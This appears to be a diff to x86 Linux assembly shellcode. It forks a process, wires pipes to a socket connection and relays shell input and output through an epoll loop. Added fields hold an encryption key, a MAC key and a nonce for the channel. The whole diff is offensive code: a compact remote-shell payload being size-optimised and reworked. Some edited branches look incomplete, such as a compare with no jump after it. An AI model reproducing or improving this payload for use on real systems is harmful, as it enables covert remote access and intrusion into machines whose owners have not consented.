@@ -76,7 +76,7 @@
 %define SYS_SENDMMSG   20 
 
 %define SIGCHLD 20
-%define BUFSIZ  64
+%define BUFSIZ  128
 
 %define SHUT_RDWR     1
 
@@ -90,13 +90,13 @@ struc sc_prop
   p_out resd 2
   pid   resd 1
   s     resd 1  
-  efd   resd 1
-  len   resd 1
-  evt   resd 1  
+  efd   resd 1  
   evts  resb epoll_event_size
+  len   resd 1
   buf   resb BUFSIZ
   ekey  resb 16         ; encryption key
-  mkey  resb 16         ; mac key   
+  mkey  resb 16         ; mac key 
+  ctr   resb 8          ; counter + nonce  
 endstruc
  
     %ifndef BIN
@@ -109,13 +109,14 @@ endstruc
 main:    
 _main:    
       pushad
-      sub    esp, sc_prop_size
+      xor    ecx, ecx
+      mov    cl, sc_prop_size
+      sub    esp, ecx
       mov    edi, esp
       mov    ebp, esp
       
       ; create read/write pipes
-      push   2
-      pop    ecx
+      mov    cl, 2
 c_pipe:      
       ; pipe(in);
       ; pipe(out);
@@ -132,7 +133,7 @@ c_pipe:
       pop    eax
       int    0x80    
       stosd                       ; save pid
-      test   eax, eax             ; zero?
+      test   eax, eax             ; already forked?
       jz     opn_con              ; open connection
 
       ; in this order..
@@ -221,37 +222,31 @@ opn_con:
       pop    eax
       xor    ebx, ebx
       int    0x80
-      stosd
-      
-      test   eax, eax
-      jle    shutdown
-      mov    ebx, [ebp+s]
+      stosd                    ; save efd
+      xchg   eax, ebx          ; ebx = efd
+      mov    edx, [ebp+s]
       clc      
 poll_init:
-      ; epoll_ctl(efd, EPOLL_CTL_ADD, i==0 ? s : out[0], &evts[0]);
-      lea    edi, [ebp+evts]
+      ; epoll_ctl(efd, EPOLL_CTL_ADD, i==0 ? s : out[0], &evts);
       mov    esi, edi
       push   EPOLLIN
-      pop    eax             ; evts[0].events = EPOLLIN
-      stosd
-      xchg   ebx, eax
-      stosd                  ; evts[0].data.fd = i==0 ? s : out[0]
-      xchg   edx, eax
-      push   SYS_epoll_ctl
-      pop    eax      
-      mov    ebx, [ebp+efd]
+      pop    eax                ; evts.events = EPOLLIN
+      mov    [esi+events], eax
+      mov    [esi+data  ], edx ; evts.data.fd = i==0 ? s : out[0]
+      mov    al, SYS_epoll_ctl    
       push   EPOLL_CTL_ADD
       pop    ecx
       int    0x80
-      mov    ebx, [ebp+p_out+4]   ; do out[0] next      
+      mov    edx, [ebp+p_out]   ; do out[0] next      
       cmc
       jc    poll_init      
+      ; now loop until user exits or some other error      
 poll_wait:
-      ; epoll_wait(efd, evts, 1, -1);
-      push   SYS_epoll_wait
-      pop    eax
+      ; epoll_wait(efd, &evts, 1, -1);
+      xor    eax, eax
+      mov    ah, 1               ; eax = SYS_epoll_wait
       mov    ebx, [ebp+efd]
-      lea    ecx, [ebp+evts]
+      mov    ecx, edi            ; ecx = evts
       push   1
       pop    edx
       or     esi, -1
@@ -259,78 +254,34 @@ poll_wait:
       
       ; if (r <= 0) break;
       test   eax, eax
-      jle    close_efd
+      jle    cls_efd
       
       ; if (!(evt & EPOLLIN)) break;
       test   al, EPOLLIN
-      jnz    close_efd
+      jnz    cls_efd
       
+      mov    ebx, [ebp+p_out]
+ 
       ; if (fd == s)
       cmp    eax, [ebp+s]
-      jne    read_stdout
       
-      ; len = read(s, buf, BUFSIZ);
+      ; len = read(r, buf, BUFSIZ);
       push   SYS_read
       pop    eax
-      mov    ebx, [ebp+s]
+      cdq
+      mov    dl, BUFSIZ
       lea    ecx, [ebp+buf]
-      mov    edx, BUFSIZ
       int    0x80      
-      mov    [ebp+len], eax
+      xchg   eax, ecx               ; ecx = len 
       
-      ; write(in[1], buf, len);
+      ; write(w, buf, len);
+      pop    ebx
       push   SYS_write
       pop    eax
-      mov    ebx, [ebp+p_in+4]
-      mov    ecx, [ebp+len]
-      int    0x80
-      jmp    poll_wait      
-read_stdout:
-      ; len = read(out[0], buf, BUFSIZ);
-      push   SYS_read
-      pop    eax
-      mov    ebx, [ebp+p_out]
-      lea    ecx, [ebp+buf]
-      mov    edx, BUFSIZ
-      int    0x80      
-      mov    [ebp+len], eax
-      
-      ; write(s, buf, len);
-      push   SYS_write
-      pop    eax
-      mov    ebx, [ebp+s]
-      mov    ecx, [ebp+len]
       int    0x80
       jmp    poll_wait
-close_efd:
-      ; epoll_ctl(efd, EPOLL_CTL_DEL, h[i], NULL);
-      push   SYS_epoll_ctl
-      pop    eax
-      mov    ebx, [ebp+efd]
-      push   EPOLL_CTL_DEL
-      pop    ecx
-      mov    edx, [ebp+s]
-      xor    esi, esi
-      int    0x80  
-
-      ; epoll_ctl(efd, EPOLL_CTL_DEL, h[i], NULL);      
-      push   SYS_epoll_ctl
-      pop    eax 
-      mov    ebx, [ebp+efd]
-      push   EPOLL_CTL_DEL
-      pop    ecx
-      mov    edx, [ebp+p_out+4]
-      xor    esi, esi
-      int    0x80       
-shutdown:
-      ; kill(pid, SIGCHLD);
-      push   SYS_kill
-      pop    eax
-      mov    ebx, [ebp+pid]
-      push   SIGCHLD
-      pop    ecx
-      int    0x80
-
+      
+cleanup:
       ; shutdown(s, SHUT_RDWR);
       push   SYS_shutdown
       pop    eax
@@ -339,12 +290,43 @@ shutdown:
       pop    ecx
       int    0x80
 
-      ; close(s);
+      clc
+      mov    edx, [ebp+s] ; fd = s
+cls_efd:      
+      ; epoll_ctl(efd, EPOLL_CTL_DEL, fd, NULL);
+      push   SYS_epoll_ctl
+      pop    eax
+      push   EPOLL_CTL_DEL
+      pop    ecx
+      xor    esi, esi
+      int    0x80
+      
+      push   ebx
+      
+      ; close(fd);
       push   SYS_close
       pop    eax
-      mov    ebx, [ebp+s]
+      mov    ebx, edx
       int    0x80
-close_pipes:
+      ; do out[0] next      
+      mov    edx, [ebp+p_out]
+      pop    ebx
+      cmc
+      jc     cls_efd
+      
+      ; close(efd);
+      push   SYS_close
+      pop    eax
+      int    0x80
+      
+      ; kill(pid, SIGCHLD);
+      push   SYS_kill
+      pop    eax
+      mov    ebx, [ebp+pid]
+      push   SIGCHLD
+      pop    ecx
+      int    0x80
+cls_inout:
       ; close(in[1]);
       push   SYS_close
       pop    eax      
@@ -360,11 +342,7 @@ exit:
       ; exit(0);
       push   SYS_exit
       pop    eax 
-      int    0x80    
-      
-      add    esp, sc_prop_size
-      popad
-      ret    
+      int    0x80     
       
 ; ***********************************
 ;
